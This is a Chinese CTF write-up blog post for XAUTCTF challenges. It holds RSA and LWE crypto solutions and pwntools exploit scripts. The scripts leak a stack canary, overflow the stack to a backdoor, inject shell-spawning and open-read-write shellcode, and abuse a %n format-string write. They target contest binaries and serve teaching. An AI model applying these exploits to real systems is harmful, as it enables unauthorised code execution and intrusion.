<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"> </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">3389616964927878781741310853191315956480258834417170086470849866192420692727199749045136855692986896313375718348538743048229582847210725029529834835813548058842302356162248532297392544538964480146052358895655793603326803812641085190199005669949039050588118723067377836651472284416724310288678830491750972225267426343652592291309600098944351229749957513453626264488620799659160485560680576771242990157</span></span><br><span class="line">dp = <span class="number">40008312476670176077019320150135078093576233427810327258745387563367163532724088700444338891183628836306769722954657737101506755763414537137056652811295235312680178563283946769876556761670653862586533</span></span><br><span class="line"> </span><br><span class="line">c = <span class="number">2751792742238347444334835452460084186799453035059927577003325906095628381320715250538921636436471076761144030529733555087963190221733614651048234326074859224867616661307460181029967874116500680469659145855412390067191720522352047027739051923014235594836182714244943467983706041145043107229428460704833233559688483136497104737765912820183578092203043788325533521188107197615771966434225751684425810745</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_p</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):</span><br><span class="line">        <span class="keyword">if</span> (dp * e - <span class="number">1</span>) % i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> n % (((dp * e - <span class="number">1</span>) // i) + <span class="number">1</span>) == <span class="number">0</span>:</span><br><span class="line">                p = ((dp * e - <span class="number">1</span>) // i) + <span class="number">1</span></span><br><span class="line">                <span class="keyword">return</span> p</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Can&#x27;t find p&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line">       </span><br><span class="line">p = get_p()</span><br><span class="line">q = n // p</span><br><span class="line">d = gmpy2.invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># b&#x27;XAUTCTF&#123;dddd_orz&#125;&#x27;</span></span><br></pre></td></tr></table></figure>



<h3 id="share"><a href="#share" class="headerlink" title="share"></a>share</h3><p><strong>题目描述</strong></p>
<p>​	<b style="color:cyan;">出题人: </b>BR</br><br>​	<b style="color:cyan;">难度: </b>简单</br></p>
<p>​	知识，与你分享~</p>
<p><strong>题解</strong></p>
<p>​	一个基础的共享素数问题，及n1和n2存在相同的最大公因数。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"> </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">n1 = <span class="number">15764889078520406701920836076060812292817953878765698736610314105828038106918188325080028536800338743533151467484230135911236243767134017276420560437765376692135662447069380717598088660825346837519135978716843594670867453570497314231997639209717919846384056209717841647511968810256832430682665776455975564920037522574969505503702536743211910833165065354666491070563101523475301655000946701431051680282687957615728002912182866022767994710798674094360877891595192138142726638005032412417208752775359412601523985035504001027817184158460091763674738627316845594712786784336672986113088953737331977561926180599434375606337</span></span><br><span class="line"></span><br><span class="line">n2 = <span class="number">19346401036563062062139543454549159705150114945241959879264773536571493620746783894677354391494522612877954114596842328432567726870205793311446829481421054930528731243333924687330931334566587856351933162850289535656464501364825930099046508911502369924917738675549416254350054528538339023126120936625464095107410157330756142083943106988057844625878857268968116935799339247484995302248522123848728632514279239675212391882461506079303159963938932119655481982477502610782757032918179210204391315194619579572325309000201631689800685605563008272939575196553459979913527058343508211662619307545414393526050493117288154807227</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">6931222651249262472228777622009307640074062714582918308674048962518853088713850622358745320182197198806415404906439687086316725830853516042648518050737676652428054945571454743246937039491660263781649524472122622436974786785630443829663969347469259303145707487294782618546985742515535431215616608742646807804814352236438108845259526935218859281002325047889680753746312809678001458900694326148953040827039566332895725666736854393609165460145691908719891068171737548037635274545563910655712187384524733461057680848976638932473103665037071161751853170823700743282965912068476502610800421086525024541138149006382481477358</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 找出最大公因数</span></span><br><span class="line">q = gmpy2.gcd(n1, n2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求出q1,q2</span></span><br><span class="line">p1 = n1 // q</span><br><span class="line">p2 = n2 // q</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求出d1,d2</span></span><br><span class="line">d1 = inverse(e, (q - <span class="number">1</span>) * (p1 - <span class="number">1</span>))</span><br><span class="line">d2 = inverse(e, (q - <span class="number">1</span>) * (p2 - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 两次加密对应两次解密</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, d2, n2)</span><br><span class="line">m = <span class="built_in">pow</span>(m, d1, n1)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># b&#x27;XAUTCTF&#123;Knouu7ED6e_t0_5H4Re_vv1TH_yov&#125;&#x27;</span></span><br></pre></td></tr></table></figure>



<h3 id="LWE"><a href="#LWE" class="headerlink" title="LWE"></a>LWE</h3><p><strong>题目描述</strong></p>
<p><b style="color:cyan;">	出题人: </b>ckyan</br><br><b style="color:cyan;">	难度: </b>普通</br></p>
<p>​	出完发现这个rand值影响很小，呜呜呜要被非预期了~</p>
<p><strong>题解</strong></p>
<p>​	附件给到：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint, choices</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_uppercase, digits</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_client</span>(<span class="params">client_socket</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        flag = f.read()</span><br><span class="line"></span><br><span class="line">    signal.alarm(<span class="number">300</span>)</span><br><span class="line"></span><br><span class="line">    q = getPrime(<span class="number">160</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        key = <span class="string">&quot;ctf_&quot;</span> + <span class="string">&quot;&quot;</span>.join(choices(ascii_uppercase + digits, k=<span class="number">15</span>))</span><br><span class="line">        x = bytes_to_long(<span class="string">&quot;&quot;</span>.join(<span class="built_in">sorted</span>(key)).encode())</span><br><span class="line">        <span class="keyword">if</span> x &lt; q:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    l = <span class="number">2</span></span><br><span class="line">    T = []</span><br><span class="line">    U = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">90</span>):</span><br><span class="line">        t = randint(<span class="number">1</span>, q)</span><br><span class="line">        u = x * t - randint(<span class="number">1</span>, q &gt;&gt; l)</span><br><span class="line">        T.append(t)</span><br><span class="line">        U.append(u)</span><br><span class="line"></span><br><span class="line">    client_socket.sendall(<span class="string">f&quot;q = <span class="subst">&#123;q&#125;</span>\n&quot;</span>.encode())</span><br><span class="line">    client_socket.sendall(<span class="string">f&quot;T = <span class="subst">&#123;T&#125;</span>\n&quot;</span>.encode())</span><br><span class="line">    client_socket.sendall(<span class="string">f&quot;U = <span class="subst">&#123;U&#125;</span>\n&quot;</span>.encode())</span><br><span class="line"></span><br><span class="line">    client_socket.sendall(<span class="string">b&quot;Enter x = &quot;</span>)</span><br><span class="line"></span><br><span class="line">    guess = <span class="built_in">int</span>(client_socket.recv(<span class="number">1024</span>).strip())</span><br><span class="line">    <span class="keyword">if</span> guess == x:</span><br><span class="line">        client_socket.sendall(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        client_socket.sendall(<span class="string">b&quot;Incorrect, try again.\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    client_socket.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_server</span>(<span class="params">host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">9999</span></span>):</span><br><span class="line">    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    server_socket.bind((host, port))</span><br><span class="line">    server_socket.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Server started on <span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        client_socket, addr = server_socket.accept()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Accepted connection from <span class="subst">&#123;addr&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            handle_client(client_socket)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Error handling client: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            start_server()</span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\nServer shutting down...&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>

<p>​	主要关注<code>handle_client()</code>函数部分，首先是取了一个160位的质数，接着进行90次循环，每次循环随机生成一个t，并与x进行运算，题目告诉了我们p,t和u，需要我们求到x。</p>
<p>​	对于此题，简单的解法是：</p>
<p>​	<code>x * t</code>的数量级是远远大于<code>randint(1, q &gt;&gt; l)</code>，对于<code>u</code>来说，<code>randint(1, q &gt;&gt; l)</code>的影响可以忽略，可以近似认为<code>u = x * t</code>，因此<code>x近似等于u//t+1</code>，本题需要使用nc命令连接，以下给出使用了pwntools的python脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">conn = remote(<span class="string">&quot;47.121.201.96&quot;</span>,<span class="number">60480</span>)</span><br><span class="line"></span><br><span class="line">q = <span class="built_in">str</span>(conn.recvline())[<span class="number">6</span>:-<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">T = json.loads(<span class="built_in">str</span>(conn.recvline())[<span class="number">6</span>:-<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line">U = json.loads(<span class="built_in">str</span>(conn.recvline())[<span class="number">6</span>:-<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(f&quot;q = &#123;q&#125;&quot;)</span></span><br><span class="line"><span class="comment"># print(f&quot;U = &#123;U&#125;&quot;)</span></span><br><span class="line"><span class="comment"># print(f&quot;T = &#123;T&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line">X = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">90</span>):</span><br><span class="line">    X.append(U[i]//T[i]+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">x = Counter(X).most_common(<span class="number">1</span>)[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;x = <span class="subst">&#123;x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">conn.recvuntil(<span class="string">b&#x27;Enter x =&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.sendline(<span class="built_in">str</span>(x))</span><br><span class="line"></span><br><span class="line">res = <span class="built_in">str</span>(conn.recvline())[<span class="number">2</span>:-<span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250121221841767.png" alt="image-20250121221841767"></p>
<p>​	复杂一点的解法可以参照以下思路：</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/1d63d87f0f80eb043047f07c02af6e8a.png" alt="1d63d87f0f80eb043047f07c02af6e8a"></p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/0fd9aaf12ee9c0f29a85dcbd3293f37f.png" alt="0fd9aaf12ee9c0f29a85dcbd3293f37f"></p>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="Baby-Canary"><a href="#Baby-Canary" class="headerlink" title="Baby Canary"></a>Baby Canary</h3><p><strong>题目描述</strong></p>
<p><b style="color:cyan;">	出题人: </b>D3f4ult</br><br><b style="color:cyan;">	难度: </b>普通</br></p>
<p>​	栈溢出？你还溢不溢了？😡</p>
<p><strong>题解</strong></p>
<p>​	查看保护：</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/2e108326e5f5e4e49e5c97af9940a84b.png" alt="截图"></p>
<p>​	反编译发现是两次printf输出，且有栈溢出：</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/03bf5ae4ecd80bf678ca7f6f3215a17b.png" alt="截图"></p>
<p>​	有canary保护，但canary最低位固定为\x00截断字符输出，且该位不进行检查，溢出一字节，使得printf打印时将canary也打印出来，即可获取canary，第二次溢出时使用canary过检查进后门函数即可，脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.binary = elf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x4007EE</span></span><br><span class="line">ret = <span class="number">0x400825</span></span><br><span class="line"></span><br><span class="line">pay1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span></span><br><span class="line">pay2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;What&#x27;s your name?&quot;</span>,pay1)</span><br><span class="line">io.recv()</span><br><span class="line">canary = io.recv()[<span class="number">32</span>:<span class="number">39</span>].rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">canary = u64(canary)</span><br><span class="line"></span><br><span class="line">pay2+=p64(canary)</span><br><span class="line">pay2+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(ret)+p64(backdoor)</span><br><span class="line"></span><br><span class="line">io.sendline(pay2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>





<h3 id="ez-shellcode"><a href="#ez-shellcode" class="headerlink" title="ez_shellcode"></a>ez_shellcode</h3><p><strong>题目描述</strong></p>
<p><b style="color:cyan;">	出题人: </b>keup</br><br>    <b style="color:cyan;">难度: </b>简单</br></p>
<p>​	ez？ez！</p>
<p><strong>题解</strong></p>
<p>​	试运行题目，很直接，让输入shellcode，shellcode即用来达到目的的一段可执行机器码，或者说一段汇编语句，</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/b5cb3c11c8e6ba4919b11fdd75e1bf96.png" alt="截图"></p>
<p>​	反编译发现shellcode长度限制为256，非常充足，使用pwntools生成一段即可</p>
<p>​	脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./ez_shellcode&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote(&quot;118.89.134.213&quot;,32777)</span></span><br><span class="line"></span><br><span class="line">pay = asm(shellcraft.amd64.sh())</span><br><span class="line"></span><br><span class="line">io.sendline(pay)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h3 id="mid-shellcode"><a href="#mid-shellcode" class="headerlink" title="mid_shellcode"></a>mid_shellcode</h3><p><strong>题目描述</strong></p>
<p>​	<b style="color:cyan;">出题人: </b>keup</br><br>​	<b style="color:cyan;">难度: </b>普通</br></p>
<p>​	mid？mid！</p>
<p><strong>题解</strong></p>
<p>​	与上题相比较，发现题目大致相同，但使用同样的shellcode执行却不成功，猜测有上沙箱的可能，使用seccomp-tools dump出沙箱规则，发现禁止执行execve系统调用，且checksec发现题目未开启PIE，遂使用orw的shellcode获取flag，将flag读入bss段并读出打印，脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./mid_shellcode&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;118.89.134.213&quot;,32783)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">	gdb.attach(io)</span><br><span class="line">	pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay = asm(shellcraft.openat(<span class="number">0</span>,<span class="string">&quot;/flag&quot;</span>))</span><br><span class="line">pay+= asm(shellcraft.pread(<span class="number">3</span>,<span class="number">0x404a00</span>,<span class="number">0x30</span>))</span><br><span class="line">pay+= asm(shellcraft.write(<span class="number">1</span>,<span class="number">0x404a00</span>,<span class="number">0x30</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">io.sendline(pay)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h3 id="format-string"><a href="#format-string" class="headerlink" title="format_string"></a>format_string</h3><p><strong>题目描述</strong></p>
<p>​	<b style="color:cyan;">出题人: </b>keup</br><br><b style="color:cyan;">	难度: </b>简单</br></p>
<p>​	”格格格格格格格格格格格格格格“———发出一种奇怪的笑声</p>
<p><strong>题解</strong></p>
<p>​	试运行发现是格式化字符串的题目，</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/5985ae0682d759cd74921d356ca24b37.png" alt="截图"></p>
<p>​	拖入ida反编译，发现仅需v4[0]不等于0即</p>
<p>​	可取得shell，遂想到格式化字符串漏洞中可使用%n来赋值给某块内存区域，具体赋值的位置，可使用数字+$的形式放在占位符中间指定。脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./format_string&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;118.89.134.213&quot;,32781)</span></span><br><span class="line"></span><br><span class="line">pay = <span class="string">&quot;aa%7$n&quot;</span></span><br><span class="line"></span><br><span class="line">io.sendline(pay)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://blog.yzbrh.top">BR</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://blog.yzbrh.top/post/27dd2185.html">https://blog.yzbrh.top/post/27dd2185.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://blog.yzbrh.top" target="_blank">BR-blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/WriteUp/">WriteUp</a><a class="post-meta__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/XAUTCTF/">XAUTCTF</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.png" target="_blank"><img class="post-qr-code-img" src="/img/loading.gif" data-original="/img/wechat.png" alt="感谢你的赞赏"/></a><div class="post-qr-code-desc">感谢你的赞赏</div></li></ul></div></div><nav class="pagination-post" id="pagination"></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/loading.gif" data-original="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">BR</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">24</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/YZBRH"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">建设中~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item 